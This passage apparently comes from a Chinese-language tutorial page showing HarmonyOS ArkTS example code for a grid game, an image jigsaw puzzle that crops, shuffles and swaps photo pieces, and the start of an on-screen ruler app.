class="string">&#x27;#ffa500&#x27;</span></span><br><span class="line">                      &#125;</span><br><span class="line">                    ],</span><br><span class="line">                  &#125;).<span class="title function_">then</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="title function_">initGrid</span>();</span><br><span class="line">                  &#125;)</span><br><span class="line">                &#125;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;错误的顺序！&#x27;</span>);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.widthItem + <span class="variable language_">this</span>.marginItem * <span class="number">2</span>) * <span class="number">5</span>&#125;</span>lpx`</span>)</span><br><span class="line">      .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.widthItem + <span class="variable language_">this</span>.marginItem * <span class="number">2</span>) * <span class="number">5</span>&#125;</span>lpx`</span>)</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 开始按钮</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;开始&#x27;</span>)</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;50%&#x27;</span>)</span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">&#x27;10%&#x27;</span>)</span><br><span class="line">        .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">initGrid</span>();</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;游戏开始&#x27;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Piece"><a href="#Piece" class="headerlink" title="Piece"></a>Piece</h1><p>拼图 </p><p>算法： 随机 剪裁 交换</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; fileIo <span class="keyword">as</span> fs &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.CoreFileKit&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; common &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.AbilityKit&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; image &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ImageKit&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; photoAccessHelper &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.MediaLibraryKit&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义拼图组件接口</span></span><br><span class="line">interface <span class="title class_">PuzzlePiece</span> &#123;</span><br><span class="line">  <span class="comment">// 拼图块的像素地图</span></span><br><span class="line">  <span class="attr">pixelMap</span>: image.<span class="property">PixelMap</span>;</span><br><span class="line">  <span class="comment">// 原始图片中的索引位置</span></span><br><span class="line">  <span class="attr">originalIndex</span>: number;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 使用装饰器定义页面组件</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">Page30</span> &#123;</span><br><span class="line">  <span class="comment">// 状态变量：选中图片的URI</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">selectedImageUrl</span>: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">// 状态变量：原始图片的URI</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">originalImageUrl</span>: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">// 状态变量：存储拼图块的数组</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">puzzlePieces</span>: <span class="title class_">Array</span>&lt;<span class="title class_">PuzzlePiece</span>&gt; = [];</span><br><span class="line">  <span class="comment">// 状态变量：记录当前选中的拼图块索引</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">selectedPiece</span>: number = -<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 弹出图片选择器方法</span></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">openPicker</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">let</span> <span class="title class_">PhotoSelectOptions</span> = <span class="keyword">new</span> photoAccessHelper.<span class="title class_">PhotoSelectOptions</span>();</span><br><span class="line">      <span class="title class_">PhotoSelectOptions</span>.<span class="property">MIMEType</span> = photoAccessHelper.<span class="property">PhotoViewMIMETypes</span>.<span class="property">IMAGE_TYPE</span>;</span><br><span class="line">      <span class="title class_">PhotoSelectOptions</span>.<span class="property">maxSelectNumber</span> = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">let</span> photoPicker = <span class="keyword">new</span> photoAccessHelper.<span class="title class_">PhotoViewPicker</span>();</span><br><span class="line">      <span class="keyword">let</span> <span class="attr">uris</span>: photoAccessHelper.<span class="property">PhotoSelectResult</span> = <span class="keyword">await</span>  photoPicker.<span class="title function_">select</span>(<span class="title class_">PhotoSelectOptions</span>)</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (!uris || uris.<span class="property">photoUris</span>.<span class="property">length</span> === <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">      <span class="comment">// 获取选中图片的第一张URI</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">uri</span>: string = uris.<span class="property">photoUris</span>[<span class="number">0</span>];</span><br><span class="line">      <span class="comment">// 打开文件读取流</span></span><br><span class="line">      <span class="keyword">let</span> file = fs.<span class="title function_">openSync</span>(uri, fs.<span class="property">OpenMode</span>.<span class="property">READ_ONLY</span>);</span><br><span class="line">      <span class="comment">// 获取当前上下文</span></span><br><span class="line">      <span class="keyword">let</span> context = <span class="title function_">getContext</span>(<span class="variable language_">this</span>) <span class="keyword">as</span> common.<span class="property">UIAbilityContext</span>;</span><br><span class="line">      <span class="comment">// 新建一个保存裁剪后图片的路径</span></span><br><span class="line">      <span class="keyword">let</span> newUrl = context.<span class="property">filesDir</span> + <span class="string">&#x27;/test&#x27;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>() + <span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">      <span class="comment">// 复制图片到新的路径</span></span><br><span class="line">      fs.<span class="title function_">copyFileSync</span>(file.<span class="property">fd</span>, newUrl);</span><br><span class="line">      <span class="comment">// 关闭文件读取流</span></span><br><span class="line">      fs.<span class="title function_">closeSync</span>(file);</span><br><span class="line">      <span class="comment">// 更新状态变量：设置显示图片的URI</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">selectedImageUrl</span> = newUrl;</span><br><span class="line">      <span class="comment">// 更新状态变量：保存原始图片的URI</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">originalImageUrl</span> = uri;</span><br><span class="line">      <span class="comment">// 图片更改时触发的方法</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">imgChange</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;openPicker&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(e));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 图片更改处理方法</span></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">imgChange</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 创建图片源对象</span></span><br><span class="line">      <span class="keyword">const</span> <span class="attr">imageSource</span>: image.<span class="property">ImageSource</span> = image.<span class="title function_">createImageSource</span>(<span class="variable language_">this</span>.<span class="property">selectedImageUrl</span>);</span><br><span class="line">      <span class="comment">// 图片解码选项</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">decodingOptions</span>: image.<span class="property">DecodingOptions</span> = &#123;</span><br><span class="line">        <span class="attr">editable</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">desiredPixelFormat</span>: <span class="number">3</span>,</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="comment">// 创建像素地图</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">mPixelMap</span>: image.<span class="property">PixelMap</span> = <span class="keyword">await</span> imageSource.<span class="title function_">createPixelMap</span>(decodingOptions);</span><br><span class="line">      <span class="comment">// 获取图片信息</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">mImageInfo</span>: image.<span class="property">ImageInfo</span> = <span class="keyword">await</span> mPixelMap.<span class="title function_">getImageInfo</span>();</span><br><span class="line">      <span class="comment">// 计算每个拼图块的大小</span></span><br><span class="line">      <span class="keyword">const</span> <span class="attr">pieceSize</span>: image.<span class="property">Size</span> = &#123;</span><br><span class="line">        <span class="attr">width</span>: mImageInfo.<span class="property">size</span>.<span class="property">width</span> / <span class="number">3</span>,</span><br><span class="line">        <span class="attr">height</span>: mImageInfo.<span class="property">size</span>.<span class="property">height</span> / <span class="number">3</span>,</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="comment">// 清空已有拼图块数据</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="comment">// 遍历图片生成9个拼图块</span></span><br><span class="line">      <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="number">3</span>; row++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="number">3</span>; col++) &#123;</span><br><span class="line">          <span class="comment">// 创建基于原图的新图片源</span></span><br><span class="line">          <span class="keyword">const</span> imageSource = image.<span class="title function_">createImageSource</span>(<span class="variable language_">this</span>.<span class="property">selectedImageUrl</span>);</span><br><span class="line">          <span class="comment">// 创建新像素地图</span></span><br><span class="line">          <span class="keyword">let</span> mPixelMap = <span class="keyword">await</span> imageSource.<span class="title function_">createPixelMap</span>(decodingOptions);</span><br><span class="line">          <span class="comment">// 计算裁剪区域</span></span><br><span class="line">          <span class="keyword">const</span> <span class="attr">cutRegion</span>: image.<span class="property">Region</span> = &#123;</span><br><span class="line">            <span class="attr">x</span>: col * pieceSize.<span class="property">width</span>,</span><br><span class="line">            <span class="attr">y</span>: row * pieceSize.<span class="property">height</span>,</span><br><span class="line">            <span class="attr">size</span>: pieceSize,</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="comment">// 裁剪像素地图</span></span><br><span class="line">          <span class="keyword">await</span> mPixelMap.<span class="title function_">crop</span>(cutRegion);</span><br><span class="line">          <span class="comment">// 创建并添加拼图块至数组</span></span><br><span class="line">          <span class="keyword">const</span> <span class="attr">piece</span>: <span class="title class_">PuzzlePiece</span> = &#123;</span><br><span class="line">            <span class="attr">pixelMap</span>: mPixelMap,</span><br><span class="line">            <span class="attr">originalIndex</span>: count++,</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>.<span class="title function_">push</span>(piece);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 打乱拼图块顺序</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>.<span class="property">length</span> - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">const</span> j = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (i + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">let</span> <span class="attr">temp</span>: <span class="title class_">PuzzlePiece</span> = <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[i];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[i] = <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[j];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[j] = temp;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;imgChange&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(e));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构建UI界面</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123;</span><br><span class="line">      <span class="comment">// 添加选择图片按钮，点击后调用打开图片选择器方法</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;选择图片→&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">openPicker</span>();</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="comment">// 显示原始图片（如果已选择）</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">originalImageUrl</span>) &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;原始图片↓&#x27;</span>);</span><br><span class="line">        <span class="title class_">Image</span>(<span class="variable language_">this</span>.<span class="property">originalImageUrl</span>)</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;180lpx&#x27;</span>)</span><br><span class="line">          .<span class="title function_">height</span>(<span class="string">&#x27;180lpx&#x27;</span>)</span><br><span class="line">          .<span class="title function_">objectFit</span>(<span class="title class_">ImageFit</span>.<span class="property">Contain</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 如果有拼图块，则显示游戏区</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">puzzlePieces</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;游戏图片↓&#x27;</span>);</span><br><span class="line">        <span class="comment">// 游戏区域采用网格布局</span></span><br><span class="line">        <span class="title class_">Grid</span>() &#123;</span><br><span class="line">          <span class="comment">// 遍历所有拼图块并创建网格项</span></span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">puzzlePieces</span>, <span class="function">(<span class="params">item: PuzzlePiece, index: number</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">GridItem</span>() &#123;</span><br><span class="line">              <span class="comment">// 显示拼图块图像</span></span><br><span class="line">              <span class="title class_">Image</span>(item.<span class="property">pixelMap</span>)</span><br><span class="line">                .<span class="title function_">width</span>(<span class="string">&#x27;200lpx&#x27;</span>)</span><br><span class="line">                .<span class="title function_">height</span>(<span class="string">&#x27;200lpx&#x27;</span>)</span><br><span class="line">                .<span class="title function_">margin</span>(<span class="string">&#x27;5lpx&#x27;</span>)</span><br><span class="line">                  <span class="comment">// 根据是否选中调整缩放比例</span></span><br><span class="line">                .<span class="title function_">scale</span>(<span class="variable language_">this</span>.<span class="property">selectedPiece</span> == index ? &#123; <span class="attr">x</span>: <span class="number">0.5</span>, <span class="attr">y</span>: <span class="number">0.5</span> &#125; : &#123; <span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">1</span> &#125;)</span><br><span class="line">                  <span class="comment">// 添加点击事件处理</span></span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                  <span class="comment">// 处理拼图交换逻辑</span></span><br><span class="line">                  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedPiece</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">selectedPiece</span> = index;</span><br><span class="line">                  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedPiece</span> == index) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">selectedPiece</span> = -<span class="number">1</span>;</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">let</span> <span class="attr">temp</span>: <span class="title class_">PuzzlePiece</span> = <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[<span class="variable language_">this</span>.<span class="property">selectedPiece</span>];</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[<span class="variable language_">this</span>.<span class="property">selectedPiece</span>] = <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[index];</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[index] = temp;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">selectedPiece</span> = -<span class="number">1</span>;</span><br><span class="line">                    <span class="comment">// 检查拼图是否完成</span></span><br><span class="line">                    <span class="keyword">let</span> <span class="attr">isSucc</span>: boolean = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                      <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;====item&#x27;</span>, <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[i].<span class="property">originalIndex</span>, i);</span><br><span class="line">                      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[i].<span class="property">originalIndex</span> !== i) &#123;</span><br><span class="line">                        isSucc = <span class="literal">false</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 如果拼图完成，弹出提示对话框</span></span><br><span class="line">                    <span class="keyword">if</span> (isSucc) &#123;</span><br><span class="line">                      promptAction.<span class="title function_">showDialog</span>(&#123;</span><br><span class="line">                        <span class="attr">message</span>: <span class="string">&#x27;拼图完成！&#x27;</span>,</span><br><span class="line">                      &#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;) <span class="comment">// End of ForEach</span></span><br><span class="line">        &#125; <span class="comment">// End of Grid</span></span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#fafafa&quot;</span>); <span class="comment">// 设置网格背景色</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="comment">// End of Column</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>); <span class="comment">// 设置列宽度为100%</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ruler"><a href="#ruler" class="headerlink" title="ruler"></a>ruler</h1><p>直尺</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="variable language_">window</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>; <span class="comment">// 导入窗口相关的API</span></span><br><span class="line"><span class="keyword">import</span> &#123; deviceInfo &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.BasicServicesKit&#x27;</span>; <span class="comment">// 导入设备信息相关的API</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义直尺线类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RulerLine</span> &#123;</span><br><span class="line">  <span class="attr">index</span>: number; <span class="comment">// 线的索引</span></span><br><span class="line">  <span class="attr">height</span>: number; <span class="comment">// 线的高度</span></span><br><span class="line"> </span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">index: number, height: number</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">index</span> = index; <span class="comment">// 初始化索引</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">height</span> = height; <span class="comment">// 初始化高度</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 显示线的编号</span></span><br><span class="line">  <span class="title function_">showNumber</span>(): string &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">index</span> % <span class="number">10</span> === <span class="number">0</span> ? <span 